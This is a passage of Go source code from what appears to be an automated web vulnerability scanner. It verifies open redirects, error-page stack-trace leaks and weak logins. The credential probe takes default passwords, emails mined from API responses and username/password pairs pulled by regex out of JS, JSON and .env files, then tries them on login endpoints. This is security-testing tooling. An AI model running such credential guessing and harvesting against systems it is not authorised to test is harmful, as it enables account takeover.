				profile := types.PageProfile{
					ID: "GET " + path, URL: u, Method: "GET",
				}
				v.storeFinding(profile, types.Finding{
					Title: fmt.Sprintf("Stale external redirect allowlist entry on %s", path),
					Description: fmt.Sprintf(
						"GET %s with `%s=%s` returned a %d redirect to a high-risk external destination (%s). "+
							"The destination was learned from %s, which suggests the redirect allowlist may retain "+
							"legacy payment/address targets that are no longer intended user-facing destinations.",
						path, rt.param, seed.URL, resp.StatusCode, category, seed.Source),
					Severity:   types.SeverityLow,
					Confidence: types.ConfidenceConfirmed,
					EndpointID: "GET " + path,
					VulnType:   "open_redirect",
					ParamName:  rt.param,
					Payload:    seed.URL,
					PocRequest: fmt.Sprintf("GET %s?%s=%s HTTP/1.1\nHost: <target>\n",
						path, rt.param, seed.URL),
					PocResponse: fmt.Sprintf("HTTP/1.1 %d\nLocation: %s\n",
						resp.StatusCode, loc),
					StepsToReproduce: fmt.Sprintf(
						"1. Send GET %s?%s=%s\n"+
							"2. Server replies %d with Location: %s\n"+
							"3. Review whether this external payment/address destination is still intentionally supported.",
						path, rt.param, seed.URL, resp.StatusCode, loc),
					Impact: "Retained external payment or address destinations can keep stale donation/payment links alive through a trusted domain, " +
						"which is risky when destinations rotate, ownership changes, or outdated addresses should no longer be promoted.",
					Remediation: "Keep redirect allowlists minimal and inventory-owned. Remove stale external destinations, expire campaign/payment entries, " +
						"and require owners to re-approve high-risk destinations such as payment, wallet, or address links.",
					Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nLocation: %s\nBody: %s",
						u, resp.StatusCode, loc, truncateString(body, 300)),
				})
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s still allows high-risk external redirect seed `%s` (%s).",
						path, seed.URL, category),
					u, nil)
				break
			}
			v.dismissed++
		}
		if len(confirmedBypassByPath) >= maxOpenRedirectFindings {
			return
		}
	}
}

func (v *VerifierAgent) observedRedirectTargets(ctx context.Context) []struct {
	urlWithoutQuery string
	param           string
} {
	rows, err := v.db.Conn().Query(`
		SELECT method, url, path, query
		FROM traffic_resolved
		WHERE scan_id = ?
		  AND method = 'GET'
		  AND is_filtered = 0
		ORDER BY
		  CASE WHEN lower(path) LIKE '%redirect%' OR lower(path) LIKE '%3xx%' THEN 0 ELSE 1 END,
		  id ASC
		LIMIT 250`, v.scanID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var out []struct {
		urlWithoutQuery string
		param           string
	}
	seen := make(map[string]bool)
	for rows.Next() {
		if ctx.Err() != nil || len(out) >= 80 {
			break
		}
		var method, rawURL, pathValue, rawQuery string
		if err := rows.Scan(&method, &rawURL, &pathValue, &rawQuery); err != nil {
			continue
		}
		params := redirectParamNameCandidates(pathValue, rawQuery)
		if len(params) == 0 {
			continue
		}
		base := rawURLWithoutQuery(rawURL)
		if base == "" {
			continue
		}
		for _, param := range params {
			key := base + "|" + strings.ToLower(param)
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, struct {
				urlWithoutQuery string
				param           string
			}{base, param})
			if len(out) >= 80 {
				break
			}
		}
	}
	return out
}

func redirectParamNameCandidates(pathValue, rawQuery string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(param string) {
		param = strings.TrimSpace(param)
		if param == "" {
			return
		}
		lower := strings.ToLower(param)
		if seen[lower] {
			return
		}
		seen[lower] = true
		out = append(out, param)
	}
	values, _ := url.ParseQuery(rawQuery)
	for param := range values {
		if redirectParamNameLooksUseful(param) {
			add(param)
		}
	}
	if redirectPathLooksUseful(pathValue) {
		for _, param := range []string{
			"returnTo", "return_to", "returnUrl", "return_url",
			"redirect", "redirect_url", "redirect_uri", "url", "to",
			"next", "return", "continue", "dest", "destination", "target",
			"goto", "r",
		} {
			add(param)
		}
	}
	return out
}

func redirectPathLooksUseful(pathValue string) bool {
	lower := strings.ToLower(pathValue)
	for _, token := range []string{"redirect", "return", "callback", "continue", "goto", "/out", "/link", "3xx", "statuscode"} {
		if strings.Contains(lower, token) {
			return true
		}
	}
	return false
}

func redirectParamNameLooksUseful(param string) bool {
	switch strings.ToLower(strings.TrimSpace(param)) {
	case "returnto", "return_to", "returnurl", "return_url",
		"redirect", "redirect_url", "redirect_uri", "url", "to",
		"next", "return", "continue", "dest", "destination", "target",
		"goto", "r":
		return true
	default:
		return false
	}
}

// probeWeakCredentials tries default / commonly-guessed credentials against
// discovered login endpoints. Credentials come from the corpus wordlist
// (industry-standard defaults). Usernames are augmented with any emails
// mined from captured response bodies — so the probe works against any
// target, not just ones whose default accounts we happened to hardcode.
//
// Maps to OWASP weak-password / credential-stuffing patterns generally.
func (v *VerifierAgent) probeWeakCredentials(ctx context.Context, target string) {
	// 1. Collect candidate login URLs from two sources — we always do
	//    BOTH so SPA targets (where discovery only sees the HTML page,
	//    not the REST POST endpoint) still get their API-path candidates
	//    tested. Capping prevents unbounded blowup.
	targetBase := strings.TrimRight(originFromURL(target), "/")
	if targetBase == "" {
		targetBase = strings.TrimRight(target, "/")
	}
	discovered, _ := discovery.DiscoverLoginEndpoints(v.db, v.scanID)
	seen := make(map[string]bool)
	var loginURLs []string
	for _, ep := range discovered {
		if !seen[ep.URL] {
			seen[ep.URL] = true
			loginURLs = append(loginURLs, ep.URL)
		}
	}
	// Always also try a small corpus of REST API login paths. These are
	// industry conventions and hit the actual auth endpoint on apps where
	// discovery only found the HTML login page.
	for _, p := range []string{"/rest/user/login", "/api/auth/login", "/api/login", "/login", "/signin", "/authenticate"} {
		u := targetBase + p
		if seen[u] {
			continue
		}
		if v.endpointExists(ctx, u, "POST") {
			seen[u] = true
			loginURLs = append(loginURLs, u)
		}
	}
	if len(loginURLs) == 0 {
		return
	}

	// 2. Build the credential matrix:
	//    - passwords from the corpus wordlist
	//    - usernames = corpus usernames + emails observed in captured traffic
	//      and bounded unauthenticated identity endpoints
	corpusCreds := corpus.DefaultCredentials()
	observedEmails := v.discoverCredentialUsernames(ctx, targetBase, 40)

	// Dedicated "common passwords" pulled from entries whose username is
	// an email template (admin@example.com) — good candidates to try with
	// any observed email.
	var commonPasswords []string
	for _, c := range corpusCreds {
		if strings.Contains(c.Username, "@") {
			commonPasswords = append(commonPasswords, c.Password)
		}
	}

	type attempt struct {
		user, pass, source string
	}
	attempts := make([]attempt, 0, 96)
	seenAttempt := make(map[string]struct{})
	addAttempt := func(user, pass string, source string) {
		user = strings.TrimSpace(user)
		pass = strings.TrimSpace(pass)
		if user == "" || pass == "" {
			return
		}
		key := strings.ToLower(user) + "\x00" + pass
		if _, ok := seenAttempt[key]; ok {
			return
		}
		seenAttempt[key] = struct{}{}
		attempts = append(attempts, attempt{user: user, pass: pass, source: source})
	}
	// a) Try explicit credential pairs found in same-origin client artifacts.
	// This is not a brute-force path: the app itself disclosed both sides of
	// the credential pair in JavaScript/JSON/config-like content.
	for _, pair := range v.discoverClientCredentialPairs(ctx, 24) {
		addAttempt(pair.Username, pair.Password, pair.Source)
	}
	// b) Try each observed email × target-informed weak passwords next.
	// If the application leaked account identities, that is stronger recon
	// evidence than generic `demo:demo` and should be tested before falling
	// back to corpus pairs.
	for _, email := range observedEmails {
		for _, pw := range credentialPasswordCandidatesForUser(email, commonPasswords) {
			addAttempt(email, pw, "observed account identity + weak-password heuristic")
		}
	}
	// c) Try each corpus pair verbatim.
	for _, c := range corpusCreds {
		addAttempt(c.Username, c.Password, "default-credential wordlist")
	}
	// Cap the total to keep this a DAST probe, not a brute-forcer.
	if len(attempts) > 80 {
		attempts = attempts[:80]
	}

	confirmedUsers := make(map[string]struct{})
	successes := 0
	for _, u := range loginURLs {
		if ctx.Err() != nil {
			return
		}
		baselineBodies := []string{
			`{"email":"aobtd-nonexistent-user@example.com","password":"wrong-password-12345"}`,
			`{"username":"aobtd-nonexistent-user","password":"wrong-password-12345"}`,
		}
		baselines := make([]weakCredentialProbeResult, len(baselineBodies))
		for i, bodyBytes := range baselineBodies {
			if result, ok := v.sendWeakCredentialLoginProbe(ctx, u, bodyBytes); ok {
				baselines[i] = result
			}
		}
		for _, at := range attempts {
			if ctx.Err() != nil {
				return
			}
			if _, ok := confirmedUsers[strings.ToLower(at.user)]; ok {
				continue
			}
			// Try both JSON-field conventions (email or username) since we
			// don't know what the endpoint expects. Earlier revision only
			// tried `email` — reviewer flagged that this silently misses
			// every `username`-keyed endpoint. Fire both shapes; one of
			// them will match whatever the server wants.
			bodies := []string{
				fmt.Sprintf(`{"email":%q,"password":%q}`, at.user, at.pass),
				fmt.Sprintf(`{"username":%q,"password":%q}`, at.user, at.pass),
			}
			confirmedAttempt := false
			for i, bodyBytes := range bodies {
				result, ok := v.sendWeakCredentialLoginProbe(ctx, u, bodyBytes)
				if !ok {
					continue
				}
				v.tested++

				// Confirmation: 200 plus a concrete auth artifact. Plain text
				// matches such as "authentication-service" in an HTML shell are
				// not enough to call weak credentials confirmed.
				authSignal := result.AuthSignal
				if result.Status != 200 || authSignal == "" {
					v.dismissed++
					continue
				}
				if weakCredentialResultMatchesBaseline(result, baselines[i]) {
					v.dismissed++
					v.db.InsertNarration(v.scanID, "verifier", "dismissed",
						fmt.Sprintf("Credentials %s:%s produced the same auth-looking signal as the bogus baseline (%s); treating it as a login-shell/session-cookie false positive.",
							at.user, at.pass, authSignal),
						u, map[string]any{
							"auth_signal": authSignal,
							"status":      result.Status,
						})
					continue
				}
				v.confirmed++
				// Extract just the path for the EndpointID.
				path := u
				if parsed, err := url.Parse(u); err == nil {
					path = parsed.Path
				}
				profile := types.PageProfile{
					ID: "POST " + path, URL: u, Method: "POST",
				}
				source := firstNonBlank(at.source, "credential probe")
				sourceDescription := "The password appears in standard default-credentials wordlists (SecLists / CIRT.net)."
				if strings.Contains(strings.ToLower(source), "client") || strings.Contains(strings.ToLower(source), "artifact") {
					sourceDescription = "The credential pair was recovered from same-origin client-side artifact content and then confirmed against the login endpoint."
				}
				v.storeFinding(profile, types.Finding{
					Title: fmt.Sprintf("Weak / default credentials accepted at %s (%s:%s)",
						path, at.user, at.pass),
					Description: fmt.Sprintf(
						"POST %s with credentials `%s` / `%s` returned a 200 with a concrete auth signal (%s). %s Source: %s.",
						path, at.user, at.pass, authSignal, sourceDescription, source),
					Severity:   types.SeverityCritical,
					Confidence: types.ConfidenceConfirmed,
					EndpointID: "POST " + path,
					VulnType:   "weak_credentials",
					Payload:    fmt.Sprintf("email=%s password=%s", at.user, at.pass),
					PocRequest: buildRawPOSTRequest(u, "application/json", []byte(bodyBytes), nil),
					PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s",
						result.Status, truncateString(string(result.Body), 400)),
					StepsToReproduce: fmt.Sprintf(
						"1. POST %s with body %s.\n"+
							"2. Server returns 200 and issues an auth token or session cookie.\n"+
							"3. Attacker holds a valid session scoped to the weak account.",
						path, bodyBytes),
					Impact: "Administrative / user-scoped access with no exploit chain required. " +
						"One of the most common root-cause findings in production breaches.",
					Remediation: "Force password rotation on any default accounts. Require a " +
						"minimum entropy on password creation. Reject known-breached passwords " +
						"via a HaveIBeenPwned-style check.",
					Evidence: fmt.Sprintf(
						"URL: %s\nStatus: %d\nAuth success signal: %s\nCredential source: %s\nLogin body preview: %s",
						u, result.Status, authSignal, source, truncateString(string(result.Body), 300)),
				})
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s accepted credentials %s:%s from %s — weak authentication.",
						path, at.user, at.pass, source),
					u, nil)
				v.promoteBrowserSessionFromAuthResponse(ctx, u, result.Body, at.user, "weak/default credentials")
				confirmedUsers[strings.ToLower(at.user)] = struct{}{}
				successes++
				if successes >= 3 {
					return
				}
				confirmedAttempt = true
				break
			}
			if confirmedAttempt {
				continue
			}
		}
	}
}

type weakCredentialProbeResult struct {
	Status     int
	Body       []byte
	AuthSignal string
}

func (v *VerifierAgent) sendWeakCredentialLoginProbe(ctx context.Context, rawURL string, body string) (weakCredentialProbeResult, bool) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, rawURL, strings.NewReader(body))
	if err != nil {
		return weakCredentialProbeResult{}, false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "AOBTD/Verifier (weak-cred probe)")
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return weakCredentialProbeResult{}, false
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	return weakCredentialProbeResult{
		Status:     resp.StatusCode,
		Body:       respBody,
		AuthSignal: loginAuthSuccessSignal(resp, respBody),
	}, true
}

func weakCredentialResultMatchesBaseline(result, baseline weakCredentialProbeResult) bool {
	if baseline.Status == 0 || baseline.AuthSignal == "" {
		return false
	}
	return result.Status == baseline.Status &&
		result.AuthSignal == baseline.AuthSignal &&
		approxSameResponseSize(len(result.Body), len(baseline.Body))
}

type clientCredentialPair struct {
	Username string
	Password string
	Source   string
}

var clientCredentialPairRes = []*regexp.Regexp{
	regexp.MustCompile(`(?is)(?:email|username|user|login)["']?\s*[:=]\s*["']([^"'\\\s<>]{3,120})["'][^{}\n]{0,240}(?:password|passwd|pwd)["']?\s*[:=]\s*["']([^"'\\\s<>]{3,120})["']`),
	regexp.MustCompile(`(?is)(?:password|passwd|pwd)["']?\s*[:=]\s*["']([^"'\\\s<>]{3,120})["'][^{}\n]{0,240}(?:email|username|user|login)["']?\s*[:=]\s*["']([^"'\\\s<>]{3,120})["']`),
}

func (v *VerifierAgent) discoverClientCredentialPairs(ctx context.Context, limit int) []clientCredentialPair {
	if limit <= 0 {
		limit = 24
	}
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return nil
	}
	seen := make(map[string]bool)
	refetchedArtifacts := make(map[string]string)
	var out []clientCredentialPair
	for _, entry := range entries {
		if len(out) >= limit {
			continue
		}
		text, source, ok := v.clientCredentialArtifactText(ctx, entry, refetchedArtifacts)
		if !ok {
			continue
		}
		for _, pair := range extractClientCredentialPairsFromText(text, source, limit-len(out)) {
			key := strings.ToLower(pair.Username) + "\x00" + pair.Password
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, pair)
			if len(out) >= limit {
				break
			}
		}
	}
	if len(out) > 0 {
		v.db.InsertNarration(v.scanID, "verifier", "observed",
			fmt.Sprintf("Recovered %d credential-shaped pair(s) from same-origin client artifacts for bounded login verification.", len(out)),
			v.target, nil)
	}
	return out
}

func (v *VerifierAgent) clientCredentialArtifactText(ctx context.Context, entry types.TrafficEntry, refetched map[string]string) (string, string, bool) {
	if !clientCredentialArtifactCandidate(entry) {
		return "", "", false
	}
	if len(entry.Response.Body) > 0 && len(entry.Response.Body) <= 2_000_000 {
		return string(entry.Response.Body), entry.Request.URL, true
	}
	if !strings.EqualFold(entry.Request.Method, http.MethodGet) {
		return "", "", false
	}
	if refetched != nil {
		if text, ok := refetched[entry.Request.URL]; ok {
			if text == "" {
				return "", "", false
			}
			return text, entry.Request.URL + " (refetched after empty/304 capture)", true
		}
	}
	text, ok := v.refetchSameOriginClientArtifact(ctx, entry)
	if refetched != nil {
		refetched[entry.Request.URL] = text
	}
	if !ok {
		return "", "", false
	}
	return text, entry.Request.URL + " (refetched after empty/304 capture)", true
}

func (v *VerifierAgent) refetchSameOriginClientArtifact(ctx context.Context, entry types.TrafficEntry) (string, bool) {
	rawURL := strings.TrimSpace(entry.Request.URL)
	if rawURL == "" || originFromURL(rawURL) == "" {
		return "", false
	}
	targetOrigin := originFromURL(v.target)
	if targetOrigin == "" || originFromURL(rawURL) != targetOrigin {
		return "", false
	}
	if !sameOriginClientArtifactPath(entry.Request.Path, rawURL, entry.Response.ContentType) {
		return "", false
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return "", false
	}
	req.Header.Set("User-Agent", "AOBTD/Verifier (client artifact recovery)")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return "", false
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 400 {
		return "", false
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2_000_001))
	if len(body) == 0 || len(body) > 2_000_000 {
		return "", false
	}
	refetched := entry
	refetched.Response.StatusCode = resp.StatusCode
	refetched.Response.ContentType = resp.Header.Get("Content-Type")
	refetched.Response.Body = body
	if !clientCredentialArtifactCandidate(refetched) {
		return "", false
	}
	return string(body), true
}

func sameOriginClientArtifactPath(path, rawURL, contentType string) bool {
	joined := strings.ToLower(strings.TrimSpace(path + " " + rawURL + " " + contentType))
	for _, marker := range []string{
		".js", ".mjs", ".json", ".config", ".env",
		"javascript", "application/json", "text/plain", "text/",
		"config", "credential",
	} {
		if strings.Contains(joined, marker) {
			return true
		}
	}
	return false
}

func clientCredentialArtifactCandidate(entry types.TrafficEntry) bool {
	if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 400 {
		return false
	}
	ct := strings.ToLower(entry.Response.ContentType)
	path := strings.ToLower(entry.Request.Path + " " + entry.Request.URL)
	if strings.Contains(ct, "javascript") || strings.Contains(ct, "json") || strings.Contains(ct, "text/") {
		return true
	}
	return strings.Contains(path, ".js") ||
		strings.Contains(path, ".json") ||
		strings.Contains(path, ".config") ||
		strings.Contains(path, ".env") ||
		strings.Contains(path, "config") ||
		strings.Contains(path, "credential")
}

func extractClientCredentialPairsFromText(text string, source string, limit int) []clientCredentialPair {
	if limit <= 0 || strings.TrimSpace(text) == "" {
		return nil
	}
	var out []clientCredentialPair
	seen := make(map[string]bool)
	add := func(user, pass string) {
		user = strings.TrimSpace(strings.Trim(user, `"'`))
		pass = strings.TrimSpace(strings.Trim(pass, `"'`))
		if !clientCredentialUsernameLooksUsable(user) || !clientCredentialPasswordLooksUsable(pass) {
			return
		}
		key := strings.ToLower(user) + "\x00" + pass
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, clientCredentialPair{
			Username: user,
			Password: pass,
			Source:   "client-side artifact " + source,
		})
	}
	for i, re := range clientCredentialPairRes {
		for _, m := range re.FindAllStringSubmatch(text, limit*2) {
			if len(m) < 3 {
				continue
			}
			if i == 0 {
				add(m[1], m[2])
			} else {
				add(m[2], m[1])
			}
			if len(out) >= limit {
				return out
			}
		}
	}
	return out
}

func clientCredentialUsernameLooksUsable(user string) bool {
	user = strings.TrimSpace(user)
	if len(user) < 3 || len(user) > 120 {
		return false
	}
	lower := strings.ToLower(user)
	if strings.ContainsAny(user, "{}()<>;=+`") ||
		strings.Contains(lower, "this.") ||
		strings.Contains(lower, "${") ||
		strings.Contains(lower, "http://") ||
		strings.Contains(lower, "https://") {
		return false
	}
	if strings.Contains(user, "@") {
		return credentialEmailRe.MatchString(user)
	}
	for _, r := range user {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '_' || r == '-' || r == '.' {
			continue
		}
		return false
	}
	switch lower {
	case "username", "email", "login", "user", "password", "passwd":
		return false
	}
	return true
}

func clientCredentialPasswordLooksUsable(pass string) bool {
	pass = strings.TrimSpace(pass)
	if len(pass) < 3 || len(pass) > 120 {
		return false
	}
	lower := strings.ToLower(pass)
	if strings.ContainsAny(pass, "<>{}`") ||
		strings.Contains(lower, "this.") ||
		strings.Contains(lower, "${") ||
		strings.Contains(lower, "http://") ||
		strings.Contains(lower, "https://") {
		return false
	}
	switch lower {
	case "password", "passwd", "pwd", "secret", "undefined", "null", "true", "false":
		return false
	}
	return true
}

var credentialEmailRe = regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)

func (v *VerifierAgent) discoverCredentialUsernames(ctx context.Context, target string, limit int) []string {
	if limit <= 0 {
		limit = 40
	}
	seen := make(map[string]struct{})
	var out []string
	add := func(email string) {
		email = strings.ToLower(strings.TrimSpace(email))
		if email == "" {
			return
		}
		if strings.HasSuffix(email, "@owasp.org") ||
			strings.HasSuffix(email, "@npmjs.com") ||
			strings.HasSuffix(email, "@github.com") {
			return
		}
		if _, ok := seen[email]; ok {
			return
		}
		seen[email] = struct{}{}
		out = append(out, email)
	}

	if observed, err := discovery.DiscoverLikelyUsernames(v.db, v.scanID, limit); err == nil {
		for _, email := range observed {
			add(email)
			if len(out) >= limit {
				return prioritizeCredentialUsernames(out)
			}
		}
	}

	entries, _ := v.db.GetTrafficByScan(v.scanID)
	prefixes := observedAPIPrefixes(entries)
	for _, path := range sensitiveAPICandidatePaths(prefixes) {
		if ctx.Err() != nil || len(out) >= limit {
			break
		}
		resp, body, _, err := v.proactiveGET(ctx, strings.TrimRight(target, "/")+path)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			continue
		}
		// Only mine identities from responses that look like real JSON/API
		// account data, not arbitrary HTML shells or documentation pages.
		if signal := sensitiveAPIExposureSignalDetail(resp.Header.Get("Content-Type"), body); signal.Signal == "" {
			continue
		}
		for _, email := range credentialEmailRe.FindAllString(body, 80) {
			add(email)
			if len(out) >= limit {
				break
			}
		}
	}
	return prioritizeCredentialUsernames(out)
}

func prioritizeCredentialUsernames(users []string) []string {
	sort.SliceStable(users, func(i, j int) bool {
		return credentialUsernamePriority(users[i]) > credentialUsernamePriority(users[j])
	})
	return users
}

func credentialUsernamePriority(user string) int {
	lower := strings.ToLower(strings.TrimSpace(user))
	score := 0
	for _, marker := range []string{"admin", "administrator", "root", "support", "security", "sec", "ops", "accountant", "finance"} {
		if strings.Contains(lower, marker) {
			score += 10
			break
		}
	}
	if strings.Contains(lower, "@") {
		score += 2
	}
	if strings.Contains(lower, "juice-sh.op") {
		score++
	}
	if strings.Contains(lower, "demo") || strings.Contains(lower, "test") {
		score--
	}
	return score
}

func credentialPasswordCandidatesForUser(username string, commonPasswords []string) []string {
	seen := make(map[string]struct{})
	var out []string
	add := func(password string) {
		password = strings.TrimSpace(password)
		if password == "" {
			return
		}
		if _, ok := seen[password]; ok {
			return
		}
		seen[password] = struct{}{}
		out = append(out, password)
	}
	for _, password := range commonPasswords {
		add(password)
	}
	local := username
	if idx := strings.Index(local, "@"); idx > 0 {
		local = local[:idx]
	}
	local = strings.TrimSpace(local)
	if local != "" {
		add(local)
		add(local + "123")
	}
	if len(out) > 5 {
		return out[:5]
	}
	return out
}

// probeErrorHandling hits a few endpoints with payloads designed to trigger
// an exception and inspects the response for stack traces or framework
// internals. Mapped to errorHandlingChallenge (Security Misconfiguration).
func (v *VerifierAgent) probeErrorHandling(ctx context.Context, target string) {
	// (path, method, body) triples. Deliberately nonsense inputs that a
	// well-written server catches and turns into 400; a misconfigured one
	// returns a stack trace.
	cases := []struct {
		path, method, body string
	}{
		{"/rest/products/search?q=%27%22%7B%5B%5D", "GET", ""},
		{"/api/Products/9999999999999999", "GET", ""}, // integer overflow
		{"/rest/user/login", "POST", `{"email":123,"password":null}`},
		{"/api/Feedbacks/", "POST", `{"rating":"not_a_number","comment":null}`},
	}

	stackTraceSignals := []string{
		"at /app/",
		"at object.",
		"node_modules/",
		"sequelize",
		"at module._",
		"at process.",
		".js:",
		"referenceerror",
		"typeerror",
		"syntaxerror",
		"unhandledpromiserejection",
	}

	for _, tc := range cases {
		if ctx.Err() != nil {
			return
		}
		u := target + tc.path
		var req *http.Request
		var err error
		if tc.method == "POST" {
			req, err = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(tc.body))
			if err == nil {
				req.Header.Set("Content-Type", "application/json")
			}
		} else {
			req, err = http.NewRequestWithContext(ctx, "GET", u, nil)
		}
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "AOBTD/Verifier (error-handling probe)")
		resp, err := v.client.Do(req)
		if err != nil || resp == nil {
			continue
		}
		v.tested++
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
		resp.Body.Close()
		lower := strings.ToLower(string(respBody))

		hits := 0
		var matched string
		for _, sig := range stackTraceSignals {
			if strings.Contains(lower, sig) {
				hits++
				if matched == "" {
					matched = sig
				}
			}
		}
		// Require at least TWO stack-trace signals to avoid false positives
		// on generic "TypeError" in a frontend log message etc.
		if hits < 2 {
			v.dismissed++
			continue
		}

		v.confirmed++
		profile := types.PageProfile{
			ID: fmt.Sprintf("%s %s", tc.method, tc.path), URL: u, Method: tc.method,
		}
		v.storeFinding(profile, types.Finding{
			Title: fmt.Sprintf("Unhandled exception on %s %s leaks stack trace", tc.method, tc.path),
			Description: fmt.Sprintf(
				"%s %s with malformed input returned an uncaught-exception response "+
					"containing server-side stack frames (%d matching signals, first: %q). "+
					"This discloses framework internals, file paths, and library versions to "+
					"any caller able to send malformed input.",
				tc.method, tc.path, hits, matched),
			Severity:   types.SeverityMedium,
			Confidence: types.ConfidenceConfirmed,
			EndpointID: fmt.Sprintf("%s %s", tc.method, tc.path),
			VulnType:   "error_handling",
			Payload:    tc.body,
			PocRequest: fmt.Sprintf("%s %s HTTP/1.1\nHost: <target>\n\n%s",
				tc.method, tc.path, tc.body),
			PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s",
				resp.StatusCode, truncateString(string(respBody), 500)),
			StepsToReproduce: fmt.Sprintf(
				"1. Send %s %s with payload %q.\n"+
					"2. Server returns status %d with a raw stack trace in the body.\n"+
					"3. Collect the stack trace to fingerprint framework and libraries.",
				tc.method, tc.path, tc.body, resp.StatusCode),
			Impact: "Information disclosure: framework versions, file paths, and library " +
				"internals help an attacker pick the next exploit. Stack traces often " +
				"leak request-handler logic that can be turned into authZ bypasses.",
			Remediation: "Catch unhandled exceptions at a single top-level handler and return " +
				"a generic 500 with no body content. Log the trace server-side only. Ensure " +
				"development-mode verbose errors are disabled in production.",
			Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nSignal hits: %d\nBody: %s",
				u, resp.StatusCode, hits, truncateString(string(respBody), 500)),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s %s leaked a stack trace — error handling misconfigured.", tc.method, tc.path),
			u, nil)
		return // one stack-trace disclosure is enough to fail the category
	}
}

// probeObservedErrorDisclosures promotes already-captured verbose error pages
// into confirmed findings. This is intentionally passive: if the crawler,
// navigator, analyzer follow-up, or verifier already caused a 4xx/5xx page
// that includes framework stack details, a human pentester would preserve it
// instead of ignoring it because it was not produced by a specific probe.
func (v *VerifierAgent) probeObservedErrorDisclosures(ctx context.Context) {
	type observedErrorCandidate struct {
		method, rawURL, path, contentType string
		status                            int
		body                              string
	}
	rows, err := v.db.Conn().Query(`
		SELECT method, url, path, status_code, content_type, response_body
		FROM traffic_resolved
		WHERE scan_id = ?
		  AND status_code >= 400
		  AND response_body IS NOT NULL
		  AND length(response_body) > 200
		  AND is_filtered = 0
		ORDER BY status_code DESC, id ASC
		LIMIT 200`, v.scanID)
	if err != nil {
		return
	}

	seenPath := make(map[string]struct{})
	var candidates []observedErrorCandidate
	for rows.Next() {
		if ctx.Err() != nil || len(candidates) >= 3 {
			break
		}
		var method, rawURL, path, contentType string
		var status int
		var bodyBytes []byte
		if err := rows.Scan(&method, &rawURL, &path, &status, &contentType, &bodyBytes); err != nil {
			continue
		}
		if !observedErrorPathEligible(path, contentType) {
			continue
		}
		key := strings.ToUpper(method) + " " + path
		if _, ok := seenPath[key]; ok {
			continue
		}
		seenPath[key] = struct{}{}
		body := string(bodyBytes)
		hits, _ := stackTraceSignalHits(body)
		if hits < 2 {
			continue
		}
		candidates = append(candidates, observedErrorCandidate{
			method: method, rawURL: rawURL, path: path, status: status,
			contentType: contentType, body: body,
		})
	}
	rows.Close()

	for _, candidate := range candidates {
		if ctx.Err() != nil {
			return
		}
		hits, matched := stackTraceSignalHits(candidate.body)
		v.tested++
		v.confirmed++
		key := strings.ToUpper(candidate.method) + " " + candidate.path
		profile := types.PageProfile{ID: key, URL: candidate.rawURL, Method: candidate.method}
		v.storeFinding(profile, types.Finding{
			Title: fmt.Sprintf("Observed verbose error disclosure on %s %s", candidate.method, candidate.path),
			Description: fmt.Sprintf("Captured traffic for %s %s returned HTTP %d with server/framework error details (%d stack-trace signals, first: %q). This was discovered from observed application behavior, not from a target-specific payload.",
				candidate.method, candidate.path, candidate.status, hits, matched),
			Severity:   types.SeverityMedium,
			Confidence: types.ConfidenceConfirmed,
			EndpointID: key,
			VulnType:   "error_handling",
			Payload:    "(observed traffic)",
			PocRequest: fmt.Sprintf("%s %s HTTP/1.1\nHost: <target>\n", candidate.method, candidate.path),
			PocResponse: fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s",
				candidate.status, candidate.contentType, truncateString(candidate.body, 700)),
			StepsToReproduce: fmt.Sprintf("1. Send %s %s.\n2. Observe HTTP %d.\n3. The response body includes framework/server error details such as %q.",
				candidate.method, candidate.path, candidate.status, matched),
			Impact:      "Verbose errors disclose framework internals, route behavior, stack frames, and sometimes file paths. Attackers use this to fingerprint dependencies and choose follow-up exploits.",
			Remediation: "Return generic client/server errors to users and log stack traces server-side only. Disable development-mode error pages in production.",
			Evidence:    fmt.Sprintf("URL: %s\nStatus: %d\nSignal hits: %d\nFirst signal: %s\nBody: %s", candidate.rawURL, candidate.status, hits, matched, truncateString(candidate.body, 500)),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s %s exposed verbose server error details in captured traffic.", candidate.method, candidate.path),
			candidate.rawURL, nil)
	}
}

// probeObservedClickjackingControls promotes already-captured page responses
// into endpoint-specific clickjacking findings when the response either
// explicitly reports it is frameable or lacks effective frame controls. This
// turns broad recon posture observations ("missing X-Frame-Options") into
// retest-ready evidence tied to the exact target path.
func (v *VerifierAgent) probeObservedClickjackingControls(ctx context.Context) {
	type observedClickjackingCandidate struct {
		method, rawURL, path, contentType string
		status                            int
		headersJSON, body                 string
		signal                            string
	}
